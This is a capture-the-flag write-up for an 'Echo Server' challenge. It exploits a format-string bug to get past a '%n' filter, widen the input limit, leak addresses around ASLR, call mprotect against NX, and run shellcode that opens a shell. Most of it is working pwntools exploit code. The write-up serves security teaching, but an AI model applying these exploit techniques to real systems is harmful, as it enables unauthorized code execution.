# Echo Server  
Open the binary in ghidra. The executable is basically:  
```  
while (true) {  
   retrieve 12 characters  
   strip out all "%n"  
   print them  
}  
```

By trying inputs like `%x` etc it is clear that format string attacks is a  
reasonable approach. Let us attempt to write shellcode somewhere and execute
it.

First of all the alarm can be quite annoying. We can disable this in gdb via  
`handle SIGALRM ignore`.

We can attempt to use the `%n` format to write bytes somewhere. However we
note  
that the program removes `%n` if it is present in the input. Fortunately we
can  
bypass this by using the parameter field in the form of `%x$n` where `x` is
the  
parameter number (in this case, location of the stack).

Another problem is that 12 characters is rather short to write shellcode.  
I originally thought that you can only make this shorter, since if you write  
`AA...AA%x$n` the number of characters before the format string is < 12 and  
hence writing it to the location of 12 will only reduce the number. After some  
thought, however, you need not write the number to a location that is aligned  
with the word size.

Basically, the location of the length of the input is at `stack + 1054`. If we  
write at that location, the number written will be < 12:  
```  
before | 00 00 00 0c | (for 12)  
after  |[00 00 00 04]| (for 4)  
```

However, we can write at `stack + 1053`, and we can get some number like  
`4 x ff + 12` instead:  
```  
before     | 00 00 00  0c | (for 12)  
after  [00 | 00 00 04] 0c | (for 4)  
```

So this is what we are doing:  
```python  
def send(s):  
   r.recvline()  
   r.sendline(s)  
   return r.recvline()

# leak stack addr  
s = int(send("%148$x").decode().strip(), 16)  
esp = s - 682

# leak return address  
ret = int(send("%264$x").decode().strip(), 16) - 4

# expand buffer  
send(b"abcd" + p32(esp + 1053) + b"%6$n")

# fix corrupted return address  
write(esp + 4 * 264, ret + 4)  
```

We are leaking the stack address since the binary is compiled with ASLR. The  
location of where the payload is targeting itself is kind of guesswork (just  
find something in the stack that is near the current esp, and then make the  
necessary adjustments).

The leaking of return address is actually not necessary since it is a fixed  
offset from the esp but here I am doing it anyways.

Then, we do the buffer expansion by writing to `esp + 1053`. Afterwards  
we need to write back to `ret + 4` since writing to `esp + 1053` (which is not  
word aligned) corrupts this address.

Another problem is that this binary is compiled with NX, which means that  
writable regions are not executable. Fortunately we can use `mprotect` to  
make it executable. Also this `mprotect` function is somehow statically
compiled  
so we're super lucky here.

```python  
def write(loc, what):  
   while what > 0:  
       next_byte = what & 0xff  
       # print(hex(loc), hex(next_byte))

       if next_byte < 4:  
           send(b"A" * next_byte + b"%7$n" + b"A" * (4 - next_byte) + p32(loc) + b"\n")  
       else:  
           send(p32(loc) + b"A" * (next_byte - 4) + b"%5$n\n")

       loc += 1  
       what >>= 8

# call mprotect on return, then go back to main  
write(ret, context.binary.symbols['mprotect'])  
write(ret + 4, context.binary.symbols['main'])  
write(ret + 8, 0x8048000)  
write(ret + 12, 0x1000)  
write(ret + 16, 7)  
```

Afterwards, we modify the stack so that  
1. Some value becomes 1 (because the loop is actually `while (some value == 0)`)  
  and we can exit from the loop

  ```python  
  write(esp + 0xd4c4 - 0xd0b0, 1)  
  ```

2. It jumps to `mprotect` (see above) with the parameters `0x8048000` (start of  
  page to write), `0x1000` (length of memory to make executable), `7` (for
rwx)  
3. It jumps to `main` afterwards (see above)

Now, we are back in `main`, and we can write shellcode to `0x8048000` and  
execute it. One problem is that we cannot write to addresses with `10` with it  
as it corresponds to `\n`. However, we can write to `0x8048020` instead.

The first line below `esp += 16` is just trial and error really.  
```python  
esp += 16

# leak return address  
ret = u32(send("%264$x")[:4])  
print(ret)

# expand buffer  
send(b"abcd" + p32(esp + 1053) + b"%6$n")

# fix corrupted return address  
write(esp + 4 * 264, ret + 4)

def str_to_int(s):  
   n = 0  
   for c in s:  
       n *= 256  
       n += c  
   return n

# write shellcode  
write(0x8048020, str_to_int(reversed(asm(shellcraft.sh()))))  
# jump to shellcode  
write(ret, 0x8048020)

# get out  
write(esp + 0xd4c4 - 0xd0b0, 1)

r.interactive()  
```

Then we get shell.  

Original writeup
(https://github.com/h4ck3rb0b/writeups/blob/master/batpwn-2020/echo-
server/writeup.md).